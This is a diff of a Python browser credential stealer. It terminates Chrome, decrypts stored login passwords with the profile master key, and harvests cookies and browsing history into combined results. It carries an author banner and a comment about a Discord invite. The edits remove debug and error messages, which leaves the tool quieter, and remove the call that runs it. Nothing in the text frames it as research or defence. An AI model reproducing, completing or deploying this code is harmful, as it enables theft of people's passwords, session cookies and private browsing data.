@@ -13,7 +13,6 @@ def kill_chrome():
         if 'chrome.exe' in proc.info['name'].lower():
             try:
                 proc.terminate()
-                print("Terminated Chrome process:", proc.info['pid'])
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 pass
 def get_master_key(path: str):
@@ -52,7 +51,7 @@ def get_login_data(path: str, profile: str, master_key):
     for row in cursor.fetchall():
         if row[0] and row[1] and row[2]:
             password = decrypt_password(row[2], master_key)
-            result += f"Browser: {profile}\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}\n"
+            result += f"Browser: {profile}\nURL: {row[0]}\nEmail/Username: {row[1]}\nPassword: {password}\n"
             result += "------------MADE BY RAYWZW--------------\n"
     conn.close()
     os.remove(temp_login_db)
@@ -63,10 +62,8 @@ def get_cookies(path: str, profile: str):
     network_folder = os.path.join(path, profile, "Network")
     cookies_db = os.path.join(network_folder, "Cookies")
     if not os.path.exists(network_folder):
-        print(f"Error: Network folder does not exist in profile {profile}.")
         return None
     if not os.path.exists(cookies_db):
-        print(f"Error: Cookies file does not exist in the Network folder for profile {profile}.")
         return None
     result = ""
     temp_filename = f'cookies_db_{''.join(random.choices(string.ascii_lowercase + string.digits, k=4))}.db'
@@ -84,7 +81,6 @@ def get_cookies(path: str, profile: str):
         conn.close()
         os.remove(temp_path)
     except Exception as e:
-        print(f"Error reading cookies for profile {profile}: {e}")
         os.remove(temp_path)
         return None    
     return result
@@ -138,7 +134,6 @@ def extract_logins_cookies_history():
     combined_logins = ""
     combined_cookies = ""
     combined_history = ""
-    
     kill_chrome()
     time.sleep(2)
     for browser, path in browsers.items():
@@ -162,9 +157,4 @@ def extract_logins_cookies_history():
                     combined_cookies += cookies_data
                 if history_data:
                     combined_history += history_data
-    
     save_results(combined_logins, combined_cookies, combined_history)
-    print(f"Extracted login data, cookies, and history from {total_browsers} profiles across Chrome.")
-extract_logins_cookies_history()
-#well, this is awkward...
-# if ur seeing this pls dont edit the discord server invite
